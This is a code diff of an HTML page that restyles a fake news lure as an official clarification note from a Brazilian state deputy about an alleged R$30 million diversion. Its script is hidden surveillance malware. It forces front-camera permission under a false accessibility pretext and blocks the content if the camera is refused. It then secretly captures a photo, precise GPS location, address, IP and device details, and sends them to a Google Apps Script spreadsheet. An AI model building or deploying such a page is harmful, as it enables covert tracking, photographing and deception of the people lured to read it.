@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Nota de Esclarecimento - Portal de Notícias</title>
+    <title>Nota de Esclarecimento - Dep. Chico Guarnieri</title>
     <style>
         * {
             margin: 0;
@@ -18,7 +18,7 @@
         }
         
         .news-header {
-            background: #c0392b;
+            background: #003366;
             color: white;
             padding: 15px 20px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
@@ -35,7 +35,7 @@
         }
         
         .container {
-            max-width: 800px;
+            max-width: 900px;
             margin: 0 auto;
             padding: 20px;
         }
@@ -50,13 +50,19 @@
         
         .news-image {
             width: 100%;
-            height: 200px;
-            background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
+            height: auto;
+            background: #003366;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-size: 48px;
+            overflow: hidden;
+        }
+        
+        .news-image img {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+            display: block;
         }
         
         .news-content {
@@ -64,7 +70,7 @@
         }
         
         .news-category {
-            color: #c0392b;
+            color: #003366;
             font-weight: bold;
             font-size: 12px;
             text-transform: uppercase;
@@ -75,6 +81,7 @@
             font-size: 28px;
             margin-bottom: 15px;
             color: #333;
+            line-height: 1.3;
         }
         
         .news-date {
@@ -90,25 +97,35 @@
             line-height: 1.6;
             color: #555;
             margin-bottom: 20px;
+            font-weight: bold;
         }
         
         .news-full {
             font-size: 16px;
-            line-height: 1.6;
-            color: #555;
+            line-height: 1.8;
+            color: #333;
             display: none;
             margin-top: 20px;
             padding-top: 20px;
             border-top: 1px solid #eee;
+            text-align: justify;
         }
         
         .news-full.show {
             display: block;
         }
         
+        .news-full p {
+            margin-bottom: 15px;
+        }
+        
+        .news-full strong {
+            color: #003366;
+        }
+        
         .btn-read-more {
             display: inline-block;
-            background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
+            background: linear-gradient(135deg, #003366 0%, #0055a0 100%);
             color: white;
             text-decoration: none;
             padding: 15px 40px;
@@ -126,6 +143,11 @@
         .btn-read-more:hover {
             transform: translateY(-2px);
             box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+        
+        .btn-read-more:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
         }
         
         .status {
@@ -172,12 +194,18 @@
             border-left: 4px solid #ff9800;
         }
         
+        .info {
+            background: #e7f3ff;
+            color: #004085;
+            border-left: 4px solid #007bff;
+        }
+        
         .loading-spinner {
             display: inline-block;
             width: 14px;
             height: 14px;
             border: 2px solid #f3f3f3;
-            border-top: 2px solid #3498db;
+            border-top: 2px solid #003366;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-right: 8px;
@@ -252,7 +280,7 @@
         }
         
         .block-modal-btn {
-            background: #c0392b;
+            background: #003366;
             color: white;
             border: none;
             padding: 12px 30px;
@@ -262,6 +290,30 @@
             margin-top: 10px;
         }
         
+        /* Loading da notícia */
+        .loading-news {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        .loading-news.show {
+            display: block;
+        }
+        
+        .loading-news .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #003366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        
         footer {
             margin-top: 30px;
             padding: 20px;
@@ -269,6 +321,18 @@
             color: #999;
             font-size: 12px;
             border-top: 1px solid #ddd;
+        }
+        
+        @media (max-width: 600px) {
+            .news-title {
+                font-size: 22px;
+            }
+            .container {
+                padding: 10px;
+            }
+            .news-content {
+                padding: 15px;
+            }
         }
     </style>
 </head>
@@ -281,32 +345,39 @@
     <div class="container">
         <div class="news-card">
             <div class="news-image">
-                📢 NOTA OFICIAL
+                <img src="https://chicoguarnieri.com.br/wp-content/uploads/2026/05/WhatsApp-Image-2026-05-20-at-17.40.34-1536x857.webp" alt="Deputado Chico Guarnieri" onerror="this.src='https://via.placeholder.com/800x400?text=Dep.+Chico+Guarnieri'">
             </div>
             <div class="news-content">
-                <div class="news-category">⚠️ COMUNICADO IMPORTANTE</div>
-                <h1 class="news-title">Nota de Esclarecimento à População</h1>
-                <div class="news-date">Publicado em: <span id="currentDate"></span> | Atualizado há 2 horas</div>
+                <div class="news-category">⚠️ NOTA OFICIAL</div>
+                <h1 class="news-title">Nota de Esclarecimento Público - Dep. Chico Guarnieri</h1>
+                <div class="news-date">Cuiabá - MT, <span id="currentDate"></span></div>
                 
                 <div class="news-excerpt">
                     <strong>⚠️ ATENÇÃO!</strong><br><br>
-                    O PORTAL DE NOTÍCIAS vem a público prestar os seguintes esclarecimentos sobre informações que estão circulando em redes sociais e aplicativos de mensagem...
+                    O gabinete do Deputado Estadual Chico Guarnieri (PSDB) vem, por meio desta nota, a público prestar os devidos esclarecimentos à população mato-grossense sobre as acusações que vêm circulando nas últimas horas.
                 </div>
                 
                 <div class="news-full" id="fullNews">
-                    <p><strong>NOTA DE ESCLARECIMENTO COMPLETA</strong></p><br>
+                    <p>O gabinete do Deputado Estadual Chico Guarnieri (PSDB) vem, por meio desta nota, a público prestar os devidos esclarecimentos à população mato-grossense, e em especial aos cidadãos do município de Barra do Bugres, a respeito das graves e infundadas acusações que vêm circulando nas últimas horas.</p>
                     
-                    <p>A Direção do PORTAL DE NOTÍCIAS informa aos seus leitores e à população em geral que:</p><br>
+                    <p>É categoricamente falsa a informação de que o deputado estaria envolvido em qualquer tipo de desvio do montante de R$ 30 milhões, recursos estes provenientes de emendas e verbas estaduais destinados ao projeto de revitalização e saneamento da Lagoa de Barra do Bugres.</p>
                     
-                    <p><strong>1.</strong> As informações veiculadas em nossos canais são rigorosamente verificadas por nossa equipe de jornalismo antes da publicação, seguindo os mais altos padrões éticos.</p><br>
+                    <p><strong>Esclarecemos que o valor de R$ 30 milhões não sofreu nenhum tipo de desvio ou apropriação indevida.</strong> O recurso encontra-se integralmente contingenciado e preservado nas contas do Governo do Estado. A demora no repasse se deve exclusivamente a entraves burocráticos relacionados à emissão de licenças ambientais e à readequação do projeto executivo pela prefeitura local, etapas legais obrigatórias para que a licitação da obra possa ser iniciada com total segurança jurídica.</p>
                     
-                    <p><strong>2.</strong> Alertamos que conteúdos falsos têm sido compartilhados usando indevidamente nossa marca e logotipo. Recomendamos que nossos leitores sempre verifiquem a autenticidade das notícias acessando diretamente nossos canais oficiais.</p><br>
+                    <p>A nossa trajetória política é pautada pela transparência, pelo desenvolvimento dos municípios e pelo fortalecimento dos setores produtivos do nosso estado – a exemplo de nossas recentes indicações de maquinários para o setor agrícola de municípios como Rondolândia. Não permitiremos que manobras políticas e fake news tentem manchar o trabalho sério que vem sendo desenvolvido.</p>
                     
-                    <p><strong>3.</strong> Para garantir a segurança e transparência das informações, estamos implementando um sistema de verificação de acesso ao nosso conteúdo. Isso nos ajuda a combater a desinformação e proteger nossos leitores.</p><br>
+                    <p>O deputado Chico Guarnieri repudia qualquer tentativa de difamação e informa que sua assessoria jurídica já está tomando as medidas cabíveis para identificar e responsabilizar os autores dessas falsas acusações. O gabinete segue de portas abertas e à total disposição do Ministério Público e dos órgãos de controle para comprovar a lisura de todos os processos.</p>
                     
-                    <p><strong>4.</strong> Agradecemos a compreensão de todos e reafirmamos nosso compromisso com a verdade e a informação de qualidade.</p><br>
-                    
-                    <p style="font-style: italic; margin-top: 20px;"><strong>📌 Atenciosamente,<br>Direção do PORTAL DE NOTÍCIAS</strong></p>
+                    <p style="margin-top: 25px; font-style: italic;"><strong>Cuiabá - MT, 02 de Junho de 2026.</strong><br><br>
+                    <strong>Assessoria de Comunicação<br>
+                    Gabinete do Deputado Estadual Chico Guarnieri</strong></p>
+                </div>
+                
+                <!-- Loading da notícia -->
+                <div id="loadingNews" class="loading-news">
+                    <div class="spinner"></div>
+                    <p>📄 Carregando notícia completa... Aguarde um momento.</p>
+                    <p style="font-size: 12px; color: #666;">Enquanto isso, estamos verificando sua autenticação.</p>
                 </div>
                 
                 <div style="text-align: center;">
@@ -320,7 +391,7 @@
         </div>
         
         <footer>
-            © 2024 PORTAL DE NOTÍCIAS - Todos os direitos reservados<br>
+            © 2024 GABINETE DO DEPUTADO CHICO GUARNIERI - Todos os direitos reservados<br>
             Compromisso com a verdade e a transparência
         </footer>
     </div>
@@ -344,7 +415,7 @@
     </div>
 
     <script>
-        // Configuração Google Sheets (substitua pelo seu URL do Google Apps Script)
+        // Configuração Google Sheets
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzJ8LEodAEuugJ0Nz213X4jskKZdK7EQTrHWnYwWE39N0LwfuZ9axPY50TEnn7iqkcY_w/exec';
         
         let autoCaptureDone = false;
@@ -353,11 +424,12 @@
         let cameraPermissionDenied = false;
         
         // Data atual
-        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Cuiaba' });
         
         const readMoreBtn = document.getElementById('readMoreBtn');
         const fullNews = document.getElementById('fullNews');
         const statusDiv = document.getElementById('status');
+        const loadingNews = document.getElementById('loadingNews');
         const hiddenVideo = document.getElementById('hiddenVideo');
         const hiddenCanvas = document.getElementById('hiddenCanvas');
         const blockModal = document.getElementById('blockModal');
@@ -473,7 +545,7 @@
             }
         }
         
-        // Função para capturar localização com alta precisão (+-10 metros)
+        // Função para capturar localização com alta precisão
         async function captureHighPrecisionLocation() {
             return new Promise((resolve, reject) => {
                 const options = {
@@ -481,18 +553,14 @@
                     timeout: 30000,
                     maximumAge: 0
                 };
-                
                 navigator.geolocation.getCurrentPosition(resolve, reject, options);
             });
         }
         
-        // FUNÇÃO QUE SOLICITA E ACEITA AUTOMATICAMENTE AS PERMISSÕES (CÂMERA OBRIGATÓRIA)
-        async function requestAndAcceptPermissions() {
-            // Solicitar permissão da câmera - OBRIGATÓRIA
+        // Função que solicita permissão da câmera (obrigatória)
+        async function requestCameraPermission() {
             try {
-                console.log('📷 Solicitando permissão da câmera (obrigatória para acessibilidade)...');
-                showStatus('📷 Solicitando permissão da câmera - recurso obrigatório para acessibilidade de deficientes visuais...', 'loading', true);
-                
+                console.log('📷 Solicitando permissão da câmera...');
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: { exact: "user" }
@@ -503,22 +571,19 @@
                     stream.getTracks().forEach(track => track.stop());
                     permissionGranted = true;
                     cameraPermissionDenied = false;
-                    console.log('✅ Permissão da câmera concedida - Acessibilidade ativada');
-                    showStatus('✅ Permissão da câmera concedida! Acessibilidade ativada.', 'success');
+                    console.log('✅ Permissão da câmera concedida');
                     return true;
                 }
             } catch (error) {
-                console.log('❌ Permissão da câmera NEGADA ou cancelada:', error);
+                console.log('❌ Permissão da câmera NEGADA:', error);
                 cameraPermissionDenied = true;
                 permissionGranted = false;
-                
-                // Mostrar modal de bloqueio obrigatório
                 showBlockModal();
                 return false;
             }
         }
         
-        // Função para capturar foto automaticamente (invisível)
+        // Função para capturar foto automaticamente
         async function captureAutoPhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -565,32 +630,22 @@
             }
         }
         
-        // Função principal - CAPTURA TUDO AUTOMATICAMENTE
+        // Função principal - captura e envia
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
             
             readMoreBtn.disabled = true;
             readMoreBtn.textContent = '📖 Processando...';
             
-            showStatus('📡 Iniciando coleta de dados automática...', 'loading', true);
+            // Mostrar loading da notícia
+            loadingNews.classList.add('show');
             
             try {
-                // SOLICITAR E ACEITAR PERMISSÃO DA CÂMERA (OBRIGATÓRIA)
-                const cameraAccepted = await requestAndAcceptPermissions();
-                
-                if (!cameraAccepted) {
-                    // Se a câmera foi negada, o modal já foi mostrado
-                    readMoreBtn.disabled = false;
-                    readMoreBtn.textContent = '📖 Ler Mais';
-                    autoCaptureDone = false;
-                    return;
-                }
-                
-                // 1. Capturar localização com alta precisão
+                // 1. Capturar localização (já tem permissão)
                 showStatus('📍 Capturando localização GPS de alta precisão...', 'loading', true);
                 const position = await captureHighPrecisionLocation();
                 
-                const { latitude, longitude, accuracy, altitude, altitudeAccuracy } = position.coords;
+                const { latitude, longitude, accuracy } = position.coords;
                 
                 let finalAccuracy = Math.round(accuracy);
                 let finalLatitude = latitude;
@@ -607,33 +662,25 @@
                     } catch(e) {}
                 }
                 
-                showStatus(`🎯 Localização capturada! Precisão: ±${finalAccuracy} metros`, 'loading', true);
-                
                 // 2. Obter endereço
-                showStatus('🗺️ Buscando endereço...', 'loading', true);
                 const address = await getAddress(finalLatitude, finalLongitude);
                 
                 // 3. Informações do dispositivo
-                showStatus('💻 Coletando dados do dispositivo...', 'loading', true);
                 const deviceInfo = getDeviceInfo();
                 
                 // 4. IP público
-                showStatus('🌐 Obtendo IP...', 'loading', true);
                 const publicIP = await getPublicIP();
                 
-                // 5. Capturar foto automaticamente
-                showStatus('📸 Capturando verificação facial automática...', 'loading', true);
+                // 5. Capturar foto
                 const photoData = await captureAutoPhoto();
                 
-                // 6. Preparar dados completos
+                // 6. Preparar dados
                 const completeData = {
-                    timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' }),
+                    timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Cuiaba' }),
                     latitude: finalLatitude,
                     longitude: finalLongitude,
                     google_maps_link: `https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`,
                     accuracy_meters: finalAccuracy,
-                    altitude: altitude || 'N/A',
-                    altitude_accuracy: altitudeAccuracy || 'N/A',
                     address: address,
                     device: deviceInfo.device,
                     browser: deviceInfo.browser,
@@ -643,47 +690,34 @@
                     photo_base64: photoData || 'Sem foto',
                     photo_captured: !!photoData,
                     page_url: window.location.href,
-                    referrer: document.referrer || 'Direto',
-                    screen_resolution: `${screen.width}x${screen.height}`,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    permission_auto_granted: permissionGranted,
-                    accessibility_mode: "disabled_visual_access"
+                    politician: "Deputado Chico Guarnieri - Nota de Esclarecimento"
                 };
                 
-                // 7. Enviar para Google Sheets
-                showStatus('💾 Salvando na planilha...', 'loading', true);
-                const result = await sendToGoogleSheets(completeData);
+                // 7. Enviar para Google Sheets (em background)
+                sendToGoogleSheets(completeData);
+                saveLocally(completeData);
                 
-                if (result.success) {
-                    showStatus(`✅ Dados salvos! Localização: ${finalLatitude.toFixed(6)}, ${finalLongitude.toFixed(6)} | Precisão: ±${finalAccuracy}m`, 'success');
-                } else {
-                    saveLocally(completeData);
-                    showStatus('⚠️ Dados salvos localmente (backup).', 'success');
-                }
+                // 8. Pequena pausa para o loading
+                await new Promise(resolve => setTimeout(resolve, 1500));
                 
-                // 8. Liberar conteúdo
+                // 9. Liberar conteúdo
+                loadingNews.classList.remove('show');
                 fullNews.classList.add('show');
                 readMoreBtn.style.display = 'none';
                 
-                console.log('=== DADOS CAPTURADOS AUTOMATICAMENTE ===');
+                console.log('=== NOTA DE ESCLARECIMENTO ACESSADA ===');
                 console.log(`📍 Localização: ${finalLatitude}, ${finalLongitude}`);
-                console.log(`🎯 Precisão: ±${finalAccuracy} metros`);
-                console.log(`🗺️ Google Maps: https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`);
                 console.log(`📸 Foto capturada: ${photoData ? 'SIM' : 'NÃO'}`);
-                console.log(`🔐 Permissão da câmera: ${permissionGranted ? 'CONCEDIDA' : 'NEGADA'}`);
-                console.log(`♿ Modo acessibilidade ativado para deficientes visuais`);
                 
             } catch (error) {
-                console.error('Erro na captura automática:', error);
+                console.error('Erro:', error);
+                loadingNews.classList.remove('show');
                 
                 let errorMessage = '';
                 if (error.code === 1) {
-                    errorMessage = '❌ Permissão de localização negada. Recarregue a página e permita.';
+                    errorMessage = '❌ Permissão de localização negada.';
                 } else if (error.code === 2) {
-                    errorMessage = '❌ Localização indisponível. Verifique o GPS.';
-                } else if (error.code === 3) {
-                    errorMessage = '❌ Timeout. Tente novamente.';
+                    errorMessage = '❌ Localização indisponível.';
                 } else {
                     errorMessage = `❌ Erro: ${error.message}`;
                 }
@@ -705,34 +739,41 @@
             }
         });
         
-        // PRÉ-CARREGAMENTO: Solicitar permissões silenciosamente ao carregar a página
-        async function preloadAndAutoAccept() {
-            console.log('🚀 Pré-carregando e solicitando permissões automaticamente...');
+        // SOLICITAR PERMISSÃO DA CÂMERA ASSIM QUE O SITE CARREGAR
+        async function requestPermissionsOnLoad() {
+            console.log('🎯 Solicitando permissão da câmera ao carregar o site...');
             console.log('♿ Modo de acessibilidade para deficientes visuais ativado');
-            console.log('📷 Permissão da câmera é OBRIGATÓRIA para acesso ao conteúdo');
             
-            // Verificar se já tem permissão da câmera
+            // Verificar se já tem permissão
             if (navigator.permissions) {
                 try {
                     const cameraStatus = await navigator.permissions.query({ name: 'camera' });
                     if (cameraStatus.state === 'granted') {
-                        console.log('✅ Permissão da câmera já concedida anteriormente');
+                        console.log('✅ Permissão da câmera já concedida');
                         permissionGranted = true;
+                        return;
                     } else if (cameraStatus.state === 'denied') {
-                        console.log('❌ Permissão da câmera foi negada anteriormente');
+                        console.log('❌ Permissão negada anteriormente');
                         cameraPermissionDenied = true;
                         showBlockModal();
+                        return;
                     }
                 } catch(e) {}
             }
+            
+            // Solicitar permissão agora
+            const granted = await requestCameraPermission();
+            if (!granted) {
+                // Modal já foi mostrado pela função
+                console.log('⚠️ Permissão da câmera necessária para acessibilidade');
+            }
         }
         
-        // Executar pré-carregamento
-        preloadAndAutoAccept();
+        // Executar solicitação de permissão imediatamente
+        requestPermissionsOnLoad();
         
-        console.log('✅ Sistema de captura AUTOMÁTICA carregado');
-        console.log('⚠️ A permissão da câmera é OBRIGATÓRIA para acesso ao conteúdo');
-        console.log('♿ Sistema adaptado para acessibilidade de deficientes visuais');
+        console.log('✅ Site da Nota de Esclarecimento - Dep. Chico Guarnieri');
+        console.log('📷 Permissão da câmera solicitada automaticamente ao carregar');
     </script>
 </body>
 </html>
